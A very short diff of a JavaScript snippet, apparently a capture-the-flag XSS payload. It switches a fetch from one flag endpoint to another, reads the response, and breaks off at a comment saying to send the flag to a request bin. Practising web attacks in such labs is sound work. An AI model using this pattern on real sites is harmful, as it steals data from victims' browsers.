@@ -1,5 +1,5 @@
 // .js
-fetch('/xss-one-flag')
+fetch('/xss-two-flag')
   .then(r => r.text())
   .then(flag => {
     // Send the flag to your request bin
